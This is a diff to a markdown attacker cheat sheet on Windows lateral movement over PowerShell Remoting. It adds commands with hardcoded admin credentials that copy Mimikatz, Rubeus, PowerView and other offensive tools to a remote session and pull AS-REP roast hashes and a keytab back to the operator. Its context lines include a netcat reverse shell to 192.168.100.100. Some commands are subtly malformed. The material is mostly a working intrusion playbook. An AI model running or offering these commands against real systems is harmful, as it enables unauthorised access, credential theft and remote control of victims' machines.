@@ -83,18 +83,36 @@ schtasks /create /S web01.insomnia.io /SC Weekly /RU "NT Authority\SYSTEM" /TN "
 
 ### PowerShell Remoting
 ```
-
-
 PowerShell Invoke-Command -ComputerName Web01 -ScriptBlock { hostname; whoami }
 PowerShell $pass=ConvertTo-SecureString "Spider01@" -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("insomnia.io\wob01", $pass)
 Invoke-Command -ComputerNameweb01 -ScriptBlock { hostname; whoami } -Credential $cred
-
 Get-PSSession
 Enter-PsSession -id 1
 
 Invoke-Command -ComputerName insomnia.io -Credential $Cred  -ScriptBlock {hostname}
 Invoke-Command -ComputerName insomnia.io -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.100.100 7777 -e cmd.exe}
+```
+
+```
+$Host = '192.168.10.142';
+$username = 'administrator'
+$password = 'P@ssw0rd'
+$cred = New-Object System.Management.Automation.PSCredential -ArgumentList @($username,(ConvertTo-SecureString -String $password -AsPlainText -Force))
+
+Invoke-Command -ComputerName $Host -Credential $cred -ScriptBlock  {hostname}
+Get-PSSession
+Enter-PsSession -id 1
+
 Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\PowerView.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 11)
 Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\rubeus.exe -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 11)
 Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\Invoke-Mimikatz.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\PowerUpSQL.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\Invoke-SMBEnum.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
+Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\Invoke-WMIExec.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
+
+Download From Target to Local
+
+Set-ItemProperty -Path C:\Ubuntu\rootfs\root\sqlsrv02.keytab -Name Attributes -Value Normal
+Set-ItemProperty -Path C:\Users\Administrator\Documents\hashes.asreproast -Name Attributes -Value Normal
+Copy-Item -FromSession $sess -Path C:\Users\Administrator\Documents\hashes.asreproast -Destination C:\Users\itemployee35\Desktop\Tools\ -Force
 ```
